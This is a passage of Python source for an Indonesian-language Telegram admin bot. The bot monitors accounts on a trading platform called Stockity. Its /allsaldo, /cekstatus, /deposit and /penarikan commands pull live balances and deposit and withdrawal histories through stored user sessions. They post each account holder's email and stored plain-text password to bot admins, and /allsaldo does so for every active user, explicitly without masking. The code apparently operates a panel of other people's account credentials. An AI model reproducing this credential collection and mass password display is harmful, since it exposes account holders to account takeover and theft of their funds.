        txns,
        get_cur=lambda t: t.get("currency", "IDR"),
        get_amt=lambda t: t.get("amount", 0),
    )
    total_lines = "\n".join(
        f"   💵 <b>{unit} {total:,.2f}</b>  ({count} {noun}, {iso})"
        for iso, unit, count, total in breakdown
    )

    lines = [
        f"{emoji} <b>RIWAYAT {noun.upper()}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📧 <code>{session.email}</code>\n"
        f"🔑 PK: <code>{session.password or '-'}</code>\n"
        f"🆔 <code>{session.user_id}</code>\n"
        f"🧾 {len(txns)} {noun} sukses:\n"
        f"{total_lines}\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    ]
    for i, t in enumerate(txns[:10], 1):
        ts = t.get("created_at", 0) or t.get("processed_at", 0)
        dt = ts_to_wib(ts).strftime("%d %b %Y %H:%M") if ts else "-"
        u = ISO_TO_UNIT.get(t.get("currency", "IDR"), t.get("currency", "IDR"))
        lines.append(
            f"\n{i}. 💵 <b>{u} {t.get('amount', 0):,.2f}</b>\n"
            f"   💳 {t.get('handler_name') or '-'}\n"
            f"   🕐 {dt} WIB\n"
            f"   🔑 <code>{t.get('transaction_id', '-')}</code>"
        )
    if len(txns) > 10:
        lines.append(f"\n... dan {len(txns) - 10} {noun} lainnya")
    lines.append("\n━━━━━━━━━━━━━━━━━━━━━")

    await loading_msg.edit_text("\n".join(lines), parse_mode=ParseMode.HTML)


async def cmd_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler /deposit - seluruh history deposit sukses satu user (live)."""
    if not await check_admin(update):
        return
    await _per_user_txn(update, context, kind="deposit")


async def cmd_penarikan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler /penarikan - seluruh history penarikan (withdraw) sukses satu user (live)."""
    if not await check_admin(update):
        return
    await _per_user_txn(update, context, kind="withdraw")


# ============================================================
# STATISTICS & STATUS
# ============================================================

async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /stats - statistik user."""
    if not await check_admin(update):
        return

    loading_msg = await update.message.reply_text("⏳ Mengambil statistik...")

    stats = await db.get_user_statistics()
    total_sessions = await db.count_sessions()
    total_bot_admins = len(await db.list_bot_admins())

    text = (
        f"📊 <b>STATISTIK SISTEM</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>👥 Whitelist Users:</b>\n"
        f"   Total: <code>{stats.total}</code>\n"
        f"   🟢 Aktif: <code>{stats.active}</code>\n"
        f"   🔴 Nonaktif: <code>{stats.inactive}</code>\n"
        f"   🕐 Login 24h: <code>{stats.recent_24h}</code>\n"
        f"   🆕 Daftar 24h: <code>{stats.recent_added_24h}</code>\n\n"
        f"<b>🔑 Sessions:</b>\n"
        f"   Total: <code>{total_sessions}</code>\n\n"
        f"<b>🤖 Bot Admins:</b>\n"
        f"   Total: <code>{total_bot_admins}</code>\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🕐 Diperbarui: <code>{now_wib().strftime('%d %b %Y %H:%M:%S')} WIB</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )

    await loading_msg.edit_text(text, parse_mode=ParseMode.HTML)


async def cmd_cekstatus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /cekstatus - cek status lengkap user."""
    if not await check_admin(update):
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "⚠️ <b>Penggunaan:</b>\n"
            "<code>/cekstatus [user_id]</code>\n\n"
            "Menampilkan status lengkap user termasuk saldo, profile, dan whitelist.",
            parse_mode=ParseMode.HTML,
        )
        return

    user_id = args[0]
    loading_msg = await update.message.reply_text("⏳ Mengecek status user...")

    session = await db.get_session(user_id)
    if not session:
        await loading_msg.edit_text(
            f"❌ User dengan ID <code>{user_id}</code> tidak ditemukan.",
            parse_mode=ParseMode.HTML,
        )
        return

    try:
        balance = await StockityAPI.get_user_balance_by_session(session)
    except StockityAPIError:
        balance = UserBalance(currency=session.currency)

    try:
        profile = await StockityAPI.get_user_profile_by_session(session)
    except StockityAPIError:
        profile = UserProfile(id=0, email=session.email, currency=session.currency)

    whitelist = await db.get_whitelist_user(session.email)

    # Ambil deposit history untuk user ini
    recent_deposits = await db.get_recent_deposits(hours=168)
    user_deposits = [d for d in recent_deposits if d.user_id == user_id]
    total_deposited = sum(d.amount for d in user_deposits)

    text = format_user_detail(user_id, session.email, balance, profile, whitelist, pk=session.password)

    # Tambahkan info deposit
    deposit_text = (
        f"\n📥 <b>DEPOSIT TERBARU (7 hari)</b>\n"
        f"   Jumlah transaksi: <code>{len(user_deposits)}</code>\n"
        f"   Total deposit: <code>{balance.display_currency} {total_deposited:,.2f}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )

    if user_deposits[:3]:
        deposit_text += "\n   Transaksi terakhir:\n"
        for dep in user_deposits[:3]:
            deposit_text += f"   • {dep.detected_at.strftime('%d %b %H:%M')}: {dep.amount_formatted}\n"

    deposit_text += "━━━━━━━━━━━━━━━━━━━━━"

    await loading_msg.edit_text(text + "\n" + deposit_text, parse_mode=ParseMode.HTML)


# ============================================================
# ALL SALDO
# ============================================================

async def cmd_allsaldo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Handler untuk /allsaldo - fetch dan tampilkan SEMUA saldo user aktif.
    Menampilkan seluruh hasil yang berhasil diambil, tanpa limit.
    """
    if not await check_admin(update):
        return

    loading_msg = await update.message.reply_text("⏳ Mengambil daftar session aktif...")

    # Ambil SEMUA session aktif
    sessions = await db.list_sessions(active_only=True, limit=1000)
    total_sessions = len(sessions)

    if not sessions:
        await loading_msg.edit_text("ℹ️ Tidak ada session aktif yang ditemukan.")
        return

    await loading_msg.edit_text(
        f"⏳ Fetching saldo <b>{total_sessions}</b> user...\n"
        f"Harap tunggu...",
        parse_mode=ParseMode.HTML,
    )

    # Fetch semua balance concurrent — semaphore 5 biar tidak kena rate limit
    semaphore = asyncio.Semaphore(5)
    fetched: list = []   # list of (email, user_id, pk, UserBalance)
    failed_count = 0

    async def fetch_one(session):
        nonlocal failed_count
        async with semaphore:
            try:
                balance = await StockityAPI.get_user_balance_by_session(session)
                fetched.append((session.email, session.user_id, session.password, balance))
            except Exception:
                failed_count += 1

    await asyncio.gather(*[fetch_one(s) for s in sessions], return_exceptions=True)

    if not fetched:
        await loading_msg.edit_text(
            f"❌ Tidak ada saldo yang berhasil diambil dari {total_sessions} session aktif.\n"
            f"Kemungkinan semua token expired."
        )
        return

    # Sembunyikan user bersaldo real 0 agar pesan ringkas (balance tetap di-fetch).
    zero_count = sum(1 for r in fetched if r[3].real_balance <= 0)
    fetched = [r for r in fetched if r[3].real_balance > 0]
    if not fetched:
        await loading_msg.edit_text(
            f"ℹ️ Tidak ada user dengan saldo real > 0 dari {total_sessions} session aktif."
        )
        return

    # Rincian per mata uang (urut total terbesar dulu) — tak mencampur IDR + lainnya
    breakdown = _currency_breakdown(
        fetched,
        get_cur=lambda r: r[3].currency,
        get_amt=lambda r: r[3].real_balance,
    )
    cur_order = {iso: idx for idx, (iso, *_r) in enumerate(breakdown)}

    # Urut: kelompokkan per mata uang (grup currency terbesar dulu), lalu saldo
    # tertinggi dulu di dalam tiap grup.
    fetched.sort(key=lambda x: (
        cur_order.get(x[3].currency, 999),
        -x[3].real_balance,
    ))

    # ── Build baris per user (tanpa masking, tanpa limit) ──
    now_str = now_wib().strftime('%d %b %Y %H:%M') + " WIB"
    rows = []
    for i, (email, user_id, pk, balance) in enumerate(fetched, 1):
        rows.append(
            f"<b>{i}.</b> 📧 <code>{email}</code>\n"
            f"    🔑 PK : <code>{pk}</code>\n"
            f"    💵 Real : <b>{balance.real_balance_formatted}</b>"
        )

    header = (
        f"💰 <b>ALL SALDO</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ <b>{len(fetched)}</b> user bersaldo"
        + (f"  •  {zero_count} saldo 0 disembunyikan" if zero_count else "") + "\n"
        f"🕐 <code>{now_str}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
    )

    total_lines = "\n".join(
        f"   💰 <b>{unit} {total:,.2f}</b>  ({count} user, {iso})"
        for iso, unit, count, total in breakdown
    )
    footer = (
        f"\n━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 <b>TOTAL SALDO REAL PER MATA UANG</b>\n"
        f"{total_lines}\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )

    LIMIT = 3800  # sedikit di bawah batas Telegram 4096

    # Coba kirim 1 pesan saja kalau muat
    full = header + "\n\n".join(rows) + footer
    if len(full) <= LIMIT:
        await loading_msg.edit_text(full, parse_mode=ParseMode.HTML)
        return

    # Terlalu panjang — hapus loading lalu kirim bertahap
    try:
        await loading_msg.delete()
    except Exception:
        pass

    # Pecah rows ke dalam chunk-chunk
    chunks: list[str] = []
    current = header
    for row in rows:
        candidate = current + row + "\n\n"
        if len(candidate) > LIMIT:
            chunks.append(current.rstrip())
            current = row + "\n\n"
        else:
            current = candidate
    if current.strip():
        chunks.append(current.rstrip())

    total_pages = len(chunks)
    for idx, chunk in enumerate(chunks, 1):
        prefix = f"📋 <b>Halaman {idx}/{total_pages}</b>\n" if total_pages > 1 else ""
        await update.message.reply_text(prefix + chunk, parse_mode=ParseMode.HTML)

    # Footer selalu di pesan terakhir
    await update.message.reply_text(footer, parse_mode=ParseMode.HTML)


# ============================================================
# BROADCAST
# ============================================================

async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk /broadcast - kirim pesan ke semua admin."""
    if not await check_admin(update):
        return

    args = context.args
    if not args:
        await update.message.reply_text(
            "⚠️ <b>Penggunaan:</b>\n"
            "<code>/broadcast [pesan Anda di sini]</code>\n\n"
            "Pesan akan dikirim ke semua admin bot.",
            parse_mode=ParseMode.HTML,
        )
        return

    message = " ".join(args)
    sender = update.effective_user
    sender_name = f"{sender.first_name or ''} {sender.last_name or ''}".strip() or f"Admin {sender.id}"

    # Format pesan
    broadcast_text = (
        f"📢 <b>BROADCAST DARI ADMIN</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Dari: <b>{sender_name}</b>\n"
        f"🕐 Waktu: <code>{now_wib().strftime('%d %b %Y %H:%M:%S')} WIB</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{message}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )

    # Kirim ke semua admin
    admins = await db.list_bot_admins()
    sent = 0
    failed = 0

    for admin in admins:
        if admin.chat_id == sender.id:
            continue  # Skip sender
        try:
            await context.bot.send_message(
                chat_id=admin.chat_id,
                text=broadcast_text,
                parse_mode=ParseMode.HTML,
            )
            sent += 1
        except Exception:
            failed += 1

    await update.message.reply_text(
        f"✅ <b>Broadcast terkirim!</b>\n"
        f"   Berhasil: <code>{sent}</code> admin\n"
        f"   Gagal: <code>{failed}</code> admin",
        parse_mode=ParseMode.HTML,
    )


# ============================================================
# CALLBACK QUERY HANDLER
# ============================================================

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk inline keyboard callbacks."""
    query = update.callback_query
    await query.answer()

    data = query.data
    chat_id = update.effective_user.id

    # Verify admin
    if not await db.is_bot_admin(chat_id):
        await query.edit_message_text("⛔ Akses ditolak.")
        return

    if data.startswith("activate:"):
        email = data.split(":", 1)[1]
        await db.toggle_whitelist_user(email, True)
        await query.edit_message_text(
            f"✅ User <code>{email}</code> telah <b>diaktifkan</b>.\n\n"
            f"Tekan /user {email} untuk melihat detail terbaru.",
            parse_mode=ParseMode.HTML,
        )

    elif data.startswith("deactivate:"):
        email = data.split(":", 1)[1]
        await db.toggle_whitelist_user(email, False)
        await query.edit_message_text(
            f"🔴 User <code>{email}</code> telah <b>dinonaktifkan</b>.\n\n"
            f"Tekan /user {email} untuk melihat detail terbaru.",
            parse_mode=ParseMode.HTML,
        )


# ============================================================
# ERROR HANDLER
# ============================================================

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler untuk error yang tidak tertangkap."""
    logger.error("Update %s caused error: %s", update, context.error, exc_info=True)

    if update and update.effective_message:
        try:
            await update.effective_message.reply_text(
                "❌ <b>Terjadi kesalahan</b>\n"
                "Silakan coba lagi nanti atau hubungi super admin.",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass